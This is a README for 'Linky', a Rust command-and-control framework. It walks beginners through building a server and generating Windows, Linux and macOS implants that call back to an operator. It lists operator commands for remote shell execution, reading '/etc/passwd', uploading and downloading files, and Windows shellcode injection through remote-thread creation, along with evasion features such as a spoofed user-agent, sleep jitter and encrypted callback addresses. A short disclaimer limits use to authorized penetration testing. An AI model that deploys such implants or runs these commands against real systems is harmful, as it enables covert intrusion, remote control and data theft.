# Linky C2 Framework

> ⚠️ **SECURITY WARNING**
> This project was generated with assistance from Claude and Mistral AI.
> **Always review and audit the code before use in production or security-sensitive environments.**
> The authors accept no responsibility for unauthorized or illegal use.

**TL;DR - Quick Setup with Podman (3 Steps)**

```bash
# 1. Build the container image (includes full Rust toolchain for on-the-fly generation)
podman build -t linky-c2 .

# 2. Run the server (port 8443, implants volume)
#    Note: :Z is required on SELinux systems (Fedora, RHEL, etc.)
#    The Linky CLI starts automatically in this terminal.
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants:Z \
  --name linky-server \
  linky-c2

# 3. Generate a Linux implant (replace IP with your server)
#    You are already at the Linky CLI prompt after step 2.
linky> generate-linux 192.168.1.10:8443
```

**That's it!** Your implant will be in `./implants/link-linux`

💡 **No Rust installation needed!** Everything runs in containers.

For full documentation (native install, etc.), continue reading below...

---

## Architecture

Cargo workspace with 5 crates:

```
linky/
├── Cargo.toml              # Workspace root (resolver = "2")
├── server/                 # Server binary: linky
│   └── src/
│       ├── main.rs         # Entry point: server thread + GC thread + CLI thread
│       ├── server.rs       # actix-web 4 + rustls 0.23 (self-signed TLS via rcgen)
│       ├── routes.rs       # HTTP handlers: 3-stage C2 protocol
│       ├── links.rs        # Link registry and state management
│       ├── tasks.rs        # Per-link task queue
│       ├── cli.rs          # Interactive CLI (rustyline)
│       └── generate.rs     # Implant builder (invokes cargo)
├── links/
│   ├── common/             # Shared code for implants (HTTP client, encryption)
│   ├── windows/            # Windows implant  → link-windows.exe
│   ├── linux/              # Linux implant    → link-linux
│   └── osx/                # macOS implant    → link-osx
```

### C2 Protocol (3 stages)

All communication is HTTPS/JSON. Every request is validated against:
- Fixed User-Agent (IE 11)
- `banner=banner` cookie (set in stage 1)
- Rolling `x-request-id` UUID header (rotated on every poll)

```
Implant                           Server
  │                                  │
  │── GET /js ───────────────────────▶│  Stage 1: Set-Cookie: banner=banner
  │                                  │
  │── POST /static/register ─────────▶│  Stage 2: registration + initial x_request_id
  │◀─ { x_request_id } ──────────────│
  │                                  │
  │── POST /static/get ──────────────▶│  Stage 3: polling loop (every 5 s)
  │   header: x-request-id           │    → server returns next pending task
  │   body: { q, tasking }           │    ← implant submits previous task output
  │◀─ { q, tasking, x_request_id } ──│
  │         (loop)                   │
```

---

## Quick Start (Step-by-Step for Beginners)

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/linky.git
cd linky
```

### 2. Install Prerequisites

#### For Server Only (No Implant Generation):
- [Install Rust](https://www.rust-lang.org/tools/install) (version 1.70+)
- No other dependencies needed!

#### For Full Functionality (Server + Implant Generation):

**On Debian/Ubuntu:**
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install cross-compilation tools
sudo apt-get update
sudo apt-get install -y \
    musl-tools \
    mingw-w64 \
    clang \
    lld \
    pkg-config \
    libssl-dev

# Add cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
```

**On Fedora/RHEL:**
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install cross-compilation tools
sudo dnf install -y \
    musl-gcc \
    mingw64-gcc \
    clang \
    lld \
    pkg-config \
    openssl-devel

# Add cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
```

### 3. Build and Run the Server

```bash
# Build the server (release mode for better performance)
cargo build --release -p linky

# Run on port 8443 (no root required)
./target/release/linky 0.0.0.0:8443
```

The server will:
- Generate a self-signed TLS certificate automatically
- Start listening on https://0.0.0.0:8443
- Show an interactive CLI prompt

### 4. Generate Your First Implant

In the Linky CLI:

```
linky> help

  links                    Manage active links
  generate <ip:port>       Build Windows implant
  generate-linux <ip:port> Build Linux implant
  generate-osx <ip:port>   Build macOS implant
  help                     Show this help
  exit / kill              Quit linky

# Generate a Linux implant (replace with your server IP)
linky> generate-linux 192.168.1.10:8443
[*] Building link-linux for 192.168.1.10:8443...
[+] Implant written to ./link-linux
```

Your implant is now ready in the `link-linux` file!

### 5. Using Docker/Podman (Alternative to Native Installation)

If you prefer containerization:

```bash
# Build the image (includes full Rust toolchain — allows on-the-fly implant generation)
podman build -t linky-c2 .

# Run the container — the Linky CLI starts automatically.
# Note: :Z is required on SELinux systems (Fedora, RHEL, etc.)
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants:Z \
  --name linky-server \
  linky-c2

# Generate implants from the CLI prompt (already open after the command above)
linky> generate-linux 192.168.1.10:8443
```

Implants will be available in the `./implants` directory on your host.

### Interactive CLI

```
linky> help

  links                    Manage active links
  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)
  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)
  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)
  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)
  help                     Show this help
  exit / kill              Quit linky
```

#### Generating an Implant

```
linky> generate-linux 192.168.1.10:443
[*] Building link-linux (x86_64-unknown-linux-musl) for 192.168.1.10:443 …
[+] Implant written to ./link-linux

linky> generate-native 192.168.1.10:443
[*] Building link-linux-native (x86_64-unknown-linux-gnu) for 192.168.1.10:443 …
[+] Implant written to ./link-linux-native
```

The callback address is baked into the binary at compile time via `build.rs` (`cargo:rustc-env=CALLBACK=…`).

#### Interacting with a Link

```
linky> links
  -i <name>   Interact with a link
  -k <name>   Send kill task + mark as exited
  -a          Show all links (including inactive)

links> -i link-1

link-1> whoami
link-1> shell uname -a
link-1> ls /etc
link-1> cd /tmp
link-1> pwd
link-1> pid
link-1> info
link-1> ps
link-1> netstat
link-1> download /etc/passwd
link-1> upload local_file.txt /tmp/remote_file.txt
link-1> sleep 10 20
link-1> killdate 2024-12-31
link-1> back
```

Windows-only commands:
```
link-1> cmd ipconfig /all
link-1> powershell Get-Process
link-1> integrity
link-1> inject <pid> <shellcode_base64>
```

**New Phase 2 Commands:**
- `info` - Comprehensive system information (OS, CPU, memory, network, etc.)
- `ps` - List running processes with details
- `netstat` - List network connections
- `download <path>` - Download file from implant
- `upload <local> <remote>` - Upload file to implant
- `sleep <seconds> [jitter%]` - Configure sleep interval with optional jitter
- `killdate <date>` - Set automatic exit date (YYYY-MM-DD or timestamp)

---

## Implants

### Common (Windows / Linux)

| Feature             | Detail                                                         |
|---------------------|----------------------------------------------------------------|
| Transport           | HTTPS + JSON (reqwest 0.13 blocking, rustls-tls)               |
| TLS                 | Self-signed certs accepted (`danger_accept_invalid_certs`)     |
| Callback address    | Statically compiled via `build.rs`                             |
| Poll interval       | 5 seconds                                                      |
| Reconnection        | Infinite retry loop if the server is unreachable               |

### Linux

- Shell execution via `/bin/sh -c`
- `hostname`: reads `/etc/hostname`
- `platform`: reads `/etc/os-release`

### Windows

- Shell execution via `cmd.exe /C` with `CREATE_NO_WINDOW` flag
- Shellcode injection: `VirtualAllocEx` → `WriteProcessMemory` → `VirtualProtectEx(PAGE_EXECUTE_READ)` → `CreateRemoteThread`
- Integrity level: `GetTokenInformation(TokenIntegrityLevel)` → Untrusted / Low / Medium / High / System

---

## Cross-compilation

The server invokes `cargo build --release --target <triple>` inside each implant crate directory.

| Platform | Triple                      | Required toolchain     |
|----------|-----------------------------|------------------------|
| Windows  | `x86_64-pc-windows-gnu`     | `mingw-w64`            |
| Linux    | `x86_64-unknown-linux-musl` | `musl-cross`           |

```bash
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
```

---

## Docker/Podman Containerization

### Build the image

```bash
podman build -t linky-c2 .
```

The image is based on `rust:latest` and includes the full Rust toolchain and cross-compilation targets, so implants can be generated on the fly from the CLI without rebuilding the image.

### Run the container

```bash
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants:Z \
  --name linky-server \
  linky-c2
```

> **Note — SELinux (Fedora, RHEL, etc.):** The `:Z` flag on the volume mount is required on SELinux-enabled systems so that the container can write generated implants to the host directory. Omitting it will cause a `Permission denied` error when running `generate` commands.

### Usage

The server starts automatically on port 8443 with a self-signed certificate. Generated implants are written to `/implants` inside the container, which maps to `./implants` on the host.

```bash
# Generate implants from the interactive CLI
linky> generate-linux 192.168.1.10:8443
[*] Building link-linux implant (x86_64-unknown-linux-musl) for 192.168.1.10:8443 …
[+] Implant written to /implants/link-linux

linky> generate 192.168.1.10:8443
[*] Building link-windows.exe implant (x86_64-pc-windows-gnu) for 192.168.1.10:8443 …
[+] Implant written to /implants/link-windows.exe
```

To re-attach to a running container started in a separate session:

```bash
podman attach linky-server
```

### Development

#### Rebuild after changes

```bash
podman build --no-cache -t linky-c2 .
```

#### Shell into container

```bash
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants:Z \
  --entrypoint /bin/bash \
  linky-c2
```

### Notes

- Uses port 8443 to avoid privileged port requirements
- Self-signed TLS certificate is generated automatically
- The `LINKY_OUTPUT_DIR` environment variable controls where generated implants are written (default: `/implants` in container, `.` when running natively)

---

---

## Recent Improvements

### Phase 2 Implementation (Complete ✅)

**File Operations**
- `download <remote_path>` - Download files from implant to server
- `upload <local_path> <remote_path>` - Upload files from server to implant
- Base64 encoding/decoding for secure file transfer

**System Information**
- Enhanced `info` command with comprehensive system details
- Linux: OS version, kernel, CPU, memory, disks, network, uptime
- Windows: System info, CPU, memory, network adapters

**Process Management**
- `ps` command - List running processes with PID, PPID, user, and command
- Linux: Direct `/proc` parsing for detailed process information
- Windows: `tasklist` command parsing with CSV output

**Network Monitoring**
- `netstat` command - List network connections
- Linux: Parses `/proc/net/tcp`, `/proc/net/udp`, `/proc/net/tcp6`, `/proc/net/udp6`
- Windows: `netstat -ano` command parsing
- Shows protocol, local/remote addresses, state, and process info

**Operational Security**
- `sleep <seconds> [jitter_percent]` - Configurable sleep interval with optional jitter
- `killdate <date>` - Set automatic exit date (YYYY-MM-DD or timestamp)
- AES-256-GCM encryption for embedded configuration
- Runtime decryption of callback addresses

**Code Quality**
- **Code Factorization**: Created `link-common` crate for shared functionality
- HTTP client, encryption functions, and wire types moved to common crate
- ~150 lines of duplicate code eliminated
- Improved maintainability and consistency

### UI/UX Enhancements
- **Cleaner Output**: Separated UI messages from logs for better readability
- **ANSI Color Handling**: Automatic detection of non-interactive terminals to disable color codes
- **Improved Error Messages**: More descriptive error messages for build failures

### Build System Fixes
- **Native Linux Build**: Fixed `generate-native` command to correctly find and output the native Linux binary
- **Cross-compilation Paths**: Improved binary location detection for different build targets
- **macOS Build Guidance**: Enhanced error messages with clear instructions for macOS cross-compilation setup

### Code Quality
- **New UI Module**: Created dedicated `ui.rs` module for clean separation of UI and logging
- **Better Error Handling**: Improved error detection and reporting in build processes
- **Terminal Detection**: Added `atty` dependency for smart terminal detection

## Security Notice

This tool is designed for use in **authorized** penetration testing engagements only. Do not use it against systems without explicit written permission from the owner.

## Disclaimer

This project is provided for educational and offensive security research purposes. The authors accept no responsibility for unauthorized or illegal use.